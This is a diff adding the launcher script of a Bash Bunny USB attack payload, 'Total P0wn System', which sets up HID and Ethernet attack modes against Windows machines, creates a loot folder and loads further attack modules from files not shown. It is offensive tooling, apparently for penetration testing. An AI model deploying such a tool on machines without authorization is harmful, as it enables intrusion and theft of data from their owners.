@@ -1,0 +1,51 @@
+#!/bin/bash
+# Title:				BashBunny Total P0wn System
+# Description:			Multipayload handling Tool
+# Author:				PoSHMagiC0de
+# Version:				1.6.0
+# Category:				Tools
+# Target:				Windows 7+, Powershell 2.0+
+# Attackmodes:			HID, Ethernet, or both at same time
+# BashBunny Firmware:	1.3
+#
+# LED DESCRIPTIONS:
+# Solid Magenta			Attackmode initialization for both HID and Ethernet
+# Yellow Single Blink	Start HID Quack Attack
+# Cyan Inverted Blink	Node Server Initializing
+# Yellow 2x Blink		Agent being delivered
+# Yellow 3x Blink		First Job Being Delivered to Agent
+# Green					Agent Finished Successfully
+# Red					Server Errored Out
+#
+# Server port is at 1337
+
+# DO NOT MODIFY ANY CODE IN THIS FILE, USE JOBSELECT.TXT FILE TO CONFIGURE.
+REQUIRETOOL impacket
+GET SWITCH_POSITION
+# Setup for payload directory, you can set for whatever you want.
+export PAYLOADFOLDER="/root/udisk/payloads/$SWITCH_POSITION"
+# BashBunny IP. IP here will be overwritten in dualattack mode.
+export SERVERIP="172.16.64.1"
+# Config selector file to select configuration for attack mode and types.
+source $PAYLOADFOLDER/jobselect.txt
+
+
+if [ -z $ROOTFOLDERNAME]; then
+	export ROOTFOLDERNAME="bbtps"
+fi
+
+# Root path to loot folder.
+export ROOTLOOTDIR="/root/udisk/loot/$ROOTFOLDERNAME"
+
+
+# Create Root Loot Directory
+if [ ! -d $ROOTLOOTDIR ]; then
+    mkdir $ROOTLOOTDIR
+fi
+
+# Set Attack Mode Type
+if [ $ATMODE -eq 0 ]; then
+	source $PAYLOADFOLDER/payloadmods/singleattack.txt
+else
+	source $PAYLOADFOLDER/payloadmods/dualattack.txt
+fi
